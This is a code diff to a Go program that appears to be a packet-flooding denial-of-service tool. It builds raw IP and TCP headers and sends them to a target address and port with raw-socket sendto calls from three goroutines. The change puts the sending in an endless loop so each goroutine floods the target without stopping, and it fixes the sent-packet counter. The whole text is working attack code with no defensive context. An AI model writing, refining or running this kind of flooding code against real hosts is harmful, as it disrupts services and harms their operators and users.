@@ -8,6 +8,7 @@ import (
 	"log"
 	"math/rand"
 	"net"
+	"strconv"
 	"syscall"
 )
 
@@ -50,32 +51,34 @@ func handle(ip net.IP, port int) {
 	totalSend := 0
 	for i := 0; i < 3; i++ {
 		go func() {
-			srcIp := net.IP(make([]byte, 4))
+			for {
+				srcIp := net.IP(make([]byte, 4))
 
-			ipByte := ipHeader{}
-			data, err := ipByte.makeHeader(srcIp, ip)
-			if err != nil {
-				log.Fatal("Error in unpacking ip byte:\t" + err.Error())
-			}
+				ipByte := ipHeader{}
+				data, err := ipByte.makeHeader(srcIp, ip)
+				if err != nil {
+					log.Fatal("Error in unpacking ip byte:\t" + err.Error())
+				}
 
-			tcpByte := tcpHeader{}
-			tcpData, err := tcpByte.makeHeader(srcIp, ip, port)
-			if err != nil {
-				log.Fatal("Error in unpacking tcp byte:\t" + err.Error())
-			}
+				tcpByte := tcpHeader{}
+				tcpData, err := tcpByte.makeHeader(srcIp, ip, port)
+				if err != nil {
+					log.Fatal("Error in unpacking tcp byte:\t" + err.Error())
+				}
 
-			var buff []byte
-			buff = append(buff, data...)
-			buff = append(buff, tcpData...)
+				var buff []byte
+				buff = append(buff, data...)
+				buff = append(buff, tcpData...)
 
-			sockAddr := syscall.SockaddrInet4{}
-			sockAddr.Port = port
-			copy(sockAddr.Addr[:4], ip)
-			totalSend++
-			fmt.Print("Total pockets send: " + string(rune(totalSend)) + "\r")
-			err = syscall.Sendto(sock, buff, 0, &sockAddr)
-			if err != nil {
-				fmt.Println("Sendto error:\t" + err.Error())
+				sockAddr := syscall.SockaddrInet4{}
+				sockAddr.Port = port
+				copy(sockAddr.Addr[:4], ip)
+				totalSend++
+				fmt.Print("Total pockets send: " + (strconv.Itoa(totalSend)) + "\r")
+				err = syscall.Sendto(sock, buff, 0, &sockAddr)
+				if err != nil {
+					fmt.Println("Sendto error:\t" + err.Error())
+				}
 			}
 		}()
 	}
